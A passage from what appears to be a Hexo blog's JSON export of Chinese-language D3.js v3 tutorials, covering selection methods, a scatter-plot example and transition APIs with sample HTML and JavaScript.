class=\"string\">&#x27;circle&#x27;</span>)</span></span><br><span class=\"line\">            .data(dataSet)</span><br><span class=\"line\">            .enter()</span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;circle&#x27;</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> xAxis = d3.svg.axis()</span></span><br><span class=\"line\">            .scale(xScale)</span><br><span class=\"line\">            .ticks(6)</span><br><span class=\"line\"><span class=\"javascript\">            .orient(<span class=\"string\">&#x27;bottom&#x27;</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> yAxis = d3.svg.axis()</span></span><br><span class=\"line\">            .scale(yScale)</span><br><span class=\"line\">            .ticks(5)</span><br><span class=\"line\"><span class=\"javascript\">            .orient(<span class=\"string\">&#x27;left&#x27;</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;axis&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">`translate(0, <span class=\"subst\">$&#123;h - padding&#125;</span>)`</span>)</span></span><br><span class=\"line\">            .call(xAxis);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;axis&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">`translate(<span class=\"subst\">$&#123;padding&#125;</span>, 0)`</span>)</span></span><br><span class=\"line\">            .call(yAxis);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        circles.attr(<span class=\"string\">&#x27;cx&#x27;</span>, <span class=\"function\"><span class=\"params\">data</span> =&gt;</span> xScale(data[<span class=\"number\">0</span>]))</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;cy&#x27;</span>, <span class=\"function\"><span class=\"params\">data</span> =&gt;</span> yScale(data[<span class=\"number\">1</span>]))</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;r&#x27;</span>, <span class=\"function\"><span class=\"params\">data</span> =&gt;</span> rScale(data[<span class=\"number\">1</span>]));</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"选择集\"><a href=\"#选择集\" class=\"headerlink\" title=\"选择集\"></a>选择集</h1><h3 id=\"选择器\"><a href=\"#选择器\" class=\"headerlink\" title=\"选择器\"></a>选择器</h3><p><code>d3.select()</code> 与 <code>jQuery</code> 的选择器类似，支持各种 CSS3 选择器，并能通过各种条件筛选（实际上使用的是浏览器提供的查询方法 <code>document.querySelector()</code>）</p>\n<h3 id=\"元素选择\"><a href=\"#元素选择\" class=\"headerlink\" title=\"元素选择\"></a>元素选择</h3><p>说明：<code>d3.select()</code>、<code>d3.selectAll()</code> 返回值是一组选择，该选择是一组元素。D3 绑定额外的方法到该数组上（在该对象与数组间添加了一层原型链 <code>d3.selection.prototype</code>），可以在选中的元素上应用操作，例如为所有选中的元素设置属性值。</p>\n<blockquote>\n<p><code>d3.select()</code> 、<code>d3.selectAll()</code> 返回一个选集 selection，它是 D3 操作 DOM 的入口<br><code>selection.data()</code> 操作的结果是 update 选择，这表示选择的 DOM 元素已成功绑定到指定的数据元素。update 选择还包含对 enter 和 exit 的选择。</p>\n</blockquote>\n<h4 id=\"选择集（selection）\"><a href=\"#选择集（selection）\" class=\"headerlink\" title=\"选择集（selection）\"></a>选择集（<code>selection</code>）</h4><ul>\n<li>selection.select(selector): 选中第一个目标元素</li>\n<li>selection.selectAll(selector): 选中所有符合的目标元素</li>\n<li>selection.append(name)</li>\n<li>selection.insert(name, before)</li>\n<li>selection.remove()</li>\n<li>selection.empty()</li>\n<li>selection.filter(filter)</li>\n<li>selection.attr(name, value)：获取、设置元素的属性</li>\n<li>selection.style(name, value, priority)：获取、设置元素的 CSS 样式</li>\n<li>selection.classed(name, value)：获取、设置元素的 <code>class</code> 属性，可以对象的方式一次传入多个属性，</li>\n<li>selection.property(name, value)：获取、设置元素的 <code>prop</code> 特性，如是否被选中、value 等信息</li>\n<li>selection.html(value)：用来获取或设置选定元素的 HTML</li>\n<li>selection.text(value)：用来获取或设置选定元素的文本内容</li>\n<li>selection.size()</li>\n<li>selection.node()(type, listener, capture)</li>\n</ul>\n<blockquote>\n<p><strong>说明</strong></p>\n<ul>\n<li>当没有任何元素符合条件时，方法返回的是一个空的选择结果（selection）</li>\n<li>这些函数可用于单个元素以及多个元素，当应用于多元素选集时，这些函数会依次作用于其中每个元素</li>\n<li><code>attr()</code>、<code>text()</code> 等方法中中赋值时可使用函数，如 <code>function (data, i) &#123; console.log(this); &#125;</code> ，其中 <code>data</code> 指每一项数据，<code>i</code> 指索引，<code>this</code> 指当前 DOM 元素</li>\n<li>selection 选择集的 <code>select</code>、<code>append</code>、<code>insert</code>函数会返回一个新的选集，建议用缩进来区别应用于不同选集上的级联函数，如下所示：</li>\n</ul>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d3.select(<span class=\"string\">&#x27;.rect-test&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;fill&#x27;</span>, <span class=\"string\">&#x27;red&#x27;</span>)</span><br><span class=\"line\">.selectAll(<span class=\"string\">&#x27;text&#x27;</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">100</span>)</span><br><span class=\"line\">    .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"number\">100</span>);</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>selection.data(value, key) 连接指定的一组数据的和当前选择，<strong>key</strong> 函数可以被指定为控制数据是如何连接元素<ul>\n<li>没有 key 函数时，默认使用 index 连接元素，即用 index 判断 <code>enter</code>、<code>update</code> 和  <code>exit</code> 选择集</li>\n<li>有 key 函数时，用 key 函数的返回值连接元素，有利于复用 DOM 元素（与 Vue 中的 <code>v-key</code> 相似）</li>\n</ul>\n</li>\n<li>selection.datum(value) 获取或设置每个选定的元素绑定的数据，不计算一个连接（因此不计算 enter 和 exit 的选择）</li>\n<li>selection.each(callback) 遍历集合中的每个元素</li>\n<li>selection.sort(comparator) 根据指定的 comparator 函数对当前选择的元素排序</li>\n<li>selection.order() 重新插入元素到文档，使文档顺序选与择顺序就相匹配</li>\n<li>selection.call(callback) 调用指定函数，并返回当前选择（方便链式调用）<ul>\n<li><code>svg.append(&#39;g&#39;).call(axis)</code> 与 <code>axis(svg.append(&#39;g&#39;))</code> 作用一样;</li>\n</ul>\n</li>\n<li>selection.interrupt(name) 立即中断当前的过渡</li>\n<li>selection.transition(name) 为当前选择添加过渡效果</li>\n</ul>\n<p>说明：</p>\n<ul>\n<li>所有绑定了数据的父元素，其子元素均具有从父元素那里继承下来的值。</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>D3.js - 散点图<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        .axis path,</span><br><span class=\"line\">        .axis line &#123;</span><br><span class=\"line\"><span class=\"css\">            fill: none;</span></span><br><span class=\"line\"><span class=\"css\">            stroke: black;</span></span><br><span class=\"line\"><span class=\"css\">            shape-rendering: crispEdges;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .axis text &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">font-family</span>: sans-serif;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">font-size</span>: <span class=\"number\">12px</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://d3js.org/d3.v3.js&quot;</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> w = <span class=\"number\">400</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> h = <span class=\"number\">300</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> padding = <span class=\"number\">30</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> dataSet = [[<span class=\"number\">5</span>, <span class=\"number\">20</span>], [<span class=\"number\">480</span>, <span class=\"number\">90</span>], [<span class=\"number\">250</span>, <span class=\"number\">50</span>], [<span class=\"number\">100</span>, <span class=\"number\">33</span>], [<span class=\"number\">330</span>, <span class=\"number\">95</span>], [<span class=\"number\">410</span>, <span class=\"number\">12</span>], [<span class=\"number\">475</span>, <span class=\"number\">44</span>], [<span class=\"number\">25</span>, <span class=\"number\">67</span>], [<span class=\"number\">85</span>, <span class=\"number\">21</span>], [<span class=\"number\">220</span>, <span class=\"number\">88</span>]];</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> xScale = d3.scale.linear()</span></span><br><span class=\"line\"><span class=\"javascript\">            .domain([<span class=\"number\">0</span>, d3.max(dataSet, <span class=\"function\"><span class=\"params\">data</span> =&gt;</span> data[<span class=\"number\">0</span>])])</span></span><br><span class=\"line\">            .range([padding, w - padding * 2]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> yScale = d3.scale.linear()</span></span><br><span class=\"line\"><span class=\"javascript\">            .domain([<span class=\"number\">0</span>, d3.max(dataSet, <span class=\"function\"><span class=\"params\">data</span> =&gt;</span> data[<span class=\"number\">1</span>])])</span></span><br><span class=\"line\">            .range([h - padding, padding]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> rScale = d3.scale.linear()</span></span><br><span class=\"line\"><span class=\"javascript\">            .domain([<span class=\"number\">0</span>, d3.max(dataSet, <span class=\"function\"><span class=\"params\">data</span> =&gt;</span> data[<span class=\"number\">1</span>])])</span></span><br><span class=\"line\">            .range([4, 10]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> circles = svg.selectAll(<span class=\"string\">&#x27;circle&#x27;</span>)</span></span><br><span class=\"line\">            .data(dataSet)</span><br><span class=\"line\">            .enter()</span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;circle&#x27;</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> xAxis = d3.svg.axis()</span></span><br><span class=\"line\">            .scale(xScale)</span><br><span class=\"line\">            .ticks(6)</span><br><span class=\"line\"><span class=\"javascript\">            .orient(<span class=\"string\">&#x27;bottom&#x27;</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> yAxis = d3.svg.axis()</span></span><br><span class=\"line\">            .scale(yScale)</span><br><span class=\"line\">            .ticks(5)</span><br><span class=\"line\"><span class=\"javascript\">            .orient(<span class=\"string\">&#x27;left&#x27;</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;axis&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">`translate(0, <span class=\"subst\">$&#123;h - padding&#125;</span>)`</span>)</span></span><br><span class=\"line\">            .call(xAxis);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;axis&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">`translate(<span class=\"subst\">$&#123;padding&#125;</span>, 0)`</span>)</span></span><br><span class=\"line\">            .call(yAxis);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        circles.attr(<span class=\"string\">&#x27;cx&#x27;</span>, <span class=\"function\"><span class=\"params\">data</span> =&gt;</span> xScale(data[<span class=\"number\">0</span>]))</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;cy&#x27;</span>, <span class=\"function\"><span class=\"params\">data</span> =&gt;</span> yScale(data[<span class=\"number\">1</span>]))</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;r&#x27;</span>, <span class=\"function\"><span class=\"params\">data</span> =&gt;</span> rScale(data[<span class=\"number\">1</span>]));</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>"},{"title":"过渡","date":"2021-03-23T16:00:00.000Z","_content":"\n# 过渡\n\n`d3.selection.trasition` 返回一个具备过渡能力的选集\n\n> `d3.selection.data(dataSet, fn)` 的第二个参数 `fn` 数被称为对象标识函数。这个函数确保了返回对象的一致性，使数据和图形元素之间的绑定更稳定。为了保证一致性，每一个数据都应当具备一个唯一的标识，然后下次更新选集时，即便 value 发生了变化，相同 id 的数据仍然对应同一个元素。\n\nD3 过渡并不要求每个被插值的数值都有明确的起始值和结束值。\n* 如果缺失起始值，它将试图使用计算出的样式\n* 如果缺失结束值，则将当前值作为常量\n\n### 过渡效果\n* `transition.duration(duration)`: `duration` 指定动画的持续时间，默认为 250ms，可传入具体数值或函数\n* `transition.delay(delay)`: `delay` 指定动画的延迟时间，默认为 0， 可传入具体数值或函数\n* `transition.ease(type)`: `type` 指定动画的缓动函数，默认缓动函数是 `cubic-in-out`，不可传入函数（通过使用 `attrTween` 或 `styleTween` 插值器中内置的定制缓动功能）\n    * 缓动模式: `lnear`、`cubic`、`cubic-in-out`、`sin`、`sin-out`、`exp`、`circle`、`back`、`bounce`\n    * 缓动模式修饰符: `in`、 `out`、 `in-out`、 `out-in`\n\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n    <style>\n        .rect-item {\n            fill: #090;\n        }\n    </style>\n</head>\n<body>\n    <script src=\"http://d3js.org/d3.v3.js\" charset=\"utf-8\"></script>\n    <script>\n        let w = 600;\n        let h = 400;\n        let padding = 30;\n        let dataSet = [];\n        let id = 0;\n        let svg = d3.select('body')\n            .append('svg')\n            .attr('width', w)\n            .attr('height', h);\n\n        let container = svg.append('g')\n            .attr('class', 'container');\n\n        function render(data) {\n            let rects = container.selectAll('rect')\n                .data(data, (data) => data.id);\n\n            let xScale = d3.scale.linear()\n                .domain([0, data.length])\n                .range([0, w - padding * 2]);\n\n            let yScale = d3.scale.linear()\n                .domain([0, d3.max(data, (d) => d.value)])\n                .range([h - padding * 2, 0]);\n\n            // update\n            rects.attr('class', 'rect-item')\n                .transition()\n                .duration(500)\n                .attr('x', (data, i) => xScale(i))\n                .attr('y', (data) => yScale(data.value))\n                .attr('width', 20)\n                .attr('height', (data) => h - padding - yScale(data.value));  \n\n            // enter\n            rects.enter()\n                .append('rect')\n                .attr('transform', 'translate(0, 100)')\n                .transition()\n                .duration(500)\n                .delay(200)\n                .ease('ease-in-out')\n                .attr('class', 'rect-item')\n                .attr('x', (data, i) => xScale(i))\n                .attr('y', (data) => yScale(data.value))\n                .attr('width', 20)\n                .attr('transform', 'translate(0, 40)')\n                .attr('height', (data) => h - padding - yScale(data.value));\n\n            // exit\n            rects.exit()\n                .transition()\n                .duration(500)\n                .attr('x', -40)\n                .style('opacity', 0)\n                .remove();\n        }\n\n        function getRandomData() {\n            return Math.round(Math.random() * 20) + 5;\n        }\n\n        for (let i = 0; i < 15; i++) {\n            dataSet.push({\n                id: ++id,\n                value: getRandomData()\n            });\n        }\n        render(dataSet);\n\n        window.setInterval(() => {\n            dataSet.shift();\n            dataSet.push({\n                id: ++id,\n                value: getRandomData()\n            });\n            render(dataSet);\n        }, 2000);\n    </script>\n\n</body>\n</html>\n```\n\n### 中间帧动画\n\n* `attrTween(name, tween)`: 据指定的补间函数 `tween`，通过指定的名称过渡属性值\n* `styleTween(name, tween)`: 据指定的补间函数 `tween`，通过指定的 CSS 样式的属性值\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n    <style>\n        rect {\n            fill: #090;\n        }\n    </style>\n</head>\n\n<body>\n    <script src=\"http://d3js.org/d3.v3.js\" charset=\"utf-8\"></script>\n    <script>\n        let w = 600;\n        let h = 400;\n        let svg = d3.select('body')\n            .append('svg')\n            .attr('width', w)\n            .attr('height', h);\n\n        function widthTween () {\n            let quantize = d3.scale.quantize()\n                .domain([0, 1])\n                .range([40, 80, 120, 160, 200, 240, 280, 320, 360, 400]);\n\n            return (t) => quantize(t);\n        }\n\n        svg.append('g')\n            .attr('class', 'container')\n            .append('rect')\n            .attr('x', 0)\n            .attr('y', 20)\n            .attr('height', 20)\n            .attr('width', 40)\n            .transition()\n            .duration(4000)\n            .ease('linear')\n            .attr('width', 400);\n\n        svg.append('g')\n            .attr('class', 'container')\n            .append('rect')\n            .attr('x', 0)\n            .attr('y', 60)\n            .attr('height', 20)\n            .attr('width', 40)\n            .transition()\n            .duration(4000)\n            .ease('linear')\n            .attrTween('width', widthTween);\n    </script>\n\n</body>\n\n</html>\n```\n\n### 联级过渡\n\n```js\nsvg.append('g')\n    .attr('class', 'container')\n.append('rect')\n    .attr('x', 0)\n    .attr('y', 20)\n    .attr('height', 20)\n    .attr('width', 40)\n.transition()\n    .duration(2000)\n    .ease('linear')\n    .attr('width', 400)\n.transition()\n    .duration(1000)\n    .attr('height', 60)\n.transition()\n    .duration(1000)\n    .style('fill', '#00f');\n```\n\n### 选择性过渡\n\n```js\nlet data = ['Cat', 'Dog', 'Cat', 'Dog', 'Cat', 'Dog', 'Cat', 'Dog'];\n\nsvg.append('g')\n    .attr('class', 'container')\n.selectAll('rect')\n    .data(data)\n    .enter()\n.append('text')\n    .attr('class', 'text-item')\n    .attr('x', 10)\n    .attr('y', (data, i) => (i + 1) * 40)\n    .text(data => data)\n.transition()\n    .duration(1000)\n    .ease('bounce')\n    .attr('x', 500)\n.filter((data) => data === 'Cat')\n.transition()\n    .duration(600)\n    .ease('linear')\n    .attr('x', 20);\n```\n\n### 监听过渡事件\n\n```js\nlet data = ['Cat', 'Dog', 'Cat', 'Dog', 'Cat', 'Dog', 'Cat', 'Dog'];\n\nsvg.append('g')\n    .attr('class', 'container')\n.selectAll('rect')\n    .data(data)\n    .enter()\n.append('text')\n    .attr('class', 'text-item')\n    .attr('x', 10)\n    .attr('y', (data, i) => (i + 1) * 40)\n    .text(data => data)\n.transition()\n    .duration(1000)\n    .ease('bounce')\n    .attr('x', 500)\n.filter((data) => data === 'Cat')\n.transition()\n    .duration(600)\n    .ease('linear')\n    .each('start', function (data) { // 动画开始\n        d3.select(this).text(data.toUpperCase());\n    })\n    .each('end', function () { // 动画结束\n        d3.select(this).text('end');\n    })\n    .each('interrupt', function () { // 动画被打断\n        d3.select(this).text('interrupt');\n    })\n    .attr('x', 20);\n```","source":"_posts/D3.js/过渡.md","raw":"---\ntitle: 过渡\ncategories: [D3.js]\ntags: [D3.js]\ndate: 2021-03-24\n---\n\n# 过渡\n\n`d3.selection.trasition` 返回一个具备过渡能力的选集\n\n> `d3.selection.data(dataSet, fn)` 的第二个参数 `fn` 数被称为对象标识函数。这个函数确保了返回对象的一致性，使数据和图形元素之间的绑定更稳定。为了保证一致性，每一个数据都应当具备一个唯一的标识，然后下次更新选集时，即便 value 发生了变化，相同 id 的数据仍然对应同一个元素。\n\nD3 过渡并不要求每个被插值的数值都有明确的起始值和结束值。\n* 如果缺失起始值，它将试图使用计算出的样式\n* 如果缺失结束值，则将当前值作为常量\n\n### 过渡效果\n* `transition.duration(duration)`: `duration` 指定动画的持续时间，默认为 250ms，可传入具体数值或函数\n* `transition.delay(delay)`: `delay` 指定动画的延迟时间，默认为 0， 可传入具体数值或函数\n* `transition.ease(type)`: `type` 指定动画的缓动函数，默认缓动函数是 `cubic-in-out`，不可传入函数（通过使用 `attrTween` 或 `styleTween` 插值器中内置的定制缓动功能）\n    * 缓动模式: `lnear`、`cubic`、`cubic-in-out`、`sin`、`sin-out`、`exp`、`circle`、`back`、`bounce`\n    * 缓动模式修饰符: `in`、 `out`、 `in-out`、 `out-in`\n\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n    <style>\n        .rect-item {\n            fill: #090;\n        }\n    </style>\n</head>\n<body>\n    <script src=\"http://d3js.org/d3.v3.js\" charset=\"utf-8\"></script>\n    <script>\n        let w = 600;\n        let h = 400;\n        let padding = 30;\n        let dataSet = [];\n        let id = 0;\n        let svg = d3.select('body')\n            .append('svg')\n            .attr('width', w)\n            .attr('height', h);\n\n        let container = svg.append('g')\n            .attr('class', 'container');\n\n        function render(data) {\n            let rects = container.selectAll('rect')\n                .data(data, (data) => data.id);\n\n            let xScale = d3.scale.linear()\n                .domain([0, data.length])\n                .range([0, w - padding * 2]);\n\n            let yScale = d3.scale.linear()\n                .domain([0, d3.max(data, (d) => d.value)])\n                .range([h - padding * 2, 0]);\n\n            // update\n            rects.attr('class', 'rect-item')\n                .transition()\n                .duration(500)\n                .attr('x', (data, i) => xScale(i))\n                .attr('y', (data) => yScale(data.value))\n                .attr('width', 20)\n                .attr('height', (data) => h - padding - yScale(data.value));  \n\n            // enter\n            rects.enter()\n                .append('rect')\n                .attr('transform', 'translate(0, 100)')\n                .transition()\n                .duration(500)\n                .delay(200)\n                .ease('ease-in-out')\n                .attr('class', 'rect-item')\n                .attr('x', (data, i) => xScale(i))\n                .attr('y', (data) => yScale(data.value))\n                .attr('width', 20)\n                .attr('transform', 'translate(0, 40)')\n                .attr('height', (data) => h - padding - yScale(data.value));\n\n            // exit\n            rects.exit()\n                .transition()\n                .duration(500)\n                .attr('x', -40)\n                .style('opacity', 0)\n                .remove();\n        }\n\n        function getRandomData() {\n            return Math.round(Math.random() * 20) + 5;\n        }\n\n        for (let i = 0; i < 15; i++) {\n            dataSet.push({\n                id: ++id,\n                value: getRandomData()\n            });\n        }\n        render(dataSet);\n\n        window.setInterval(() => {\n            dataSet.shift();\n            dataSet.push({\n                id: ++id,\n                value: getRandomData()\n            });\n            render(dataSet);\n        }, 2000);\n    </script>\n\n</body>\n</html>\n```\n\n### 中间帧动画\n\n* `attrTween(name, tween)`: 据指定的补间函数 `tween`，通过指定的名称过渡属性值\n* `styleTween(name, tween)`: 据指定的补间函数 `tween`，通过指定的 CSS 样式的属性值\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Document</title>\n    <style>\n        rect {\n            fill: #090;\n        }\n    </style>\n</head>\n\n<body>\n    <script src=\"http://d3js.org/d3.v3.js\" charset=\"utf-8\"></script>\n    <script>\n        let w = 600;\n        let h = 400;\n        let svg = d3.select('body')\n            .append('svg')\n            .attr('width', w)\n            .attr('height', h);\n\n        function widthTween () {\n            let quantize = d3.scale.quantize()\n                .domain([0, 1])\n                .range([40, 80, 120, 160, 200, 240, 280, 320, 360, 400]);\n\n            return (t) => 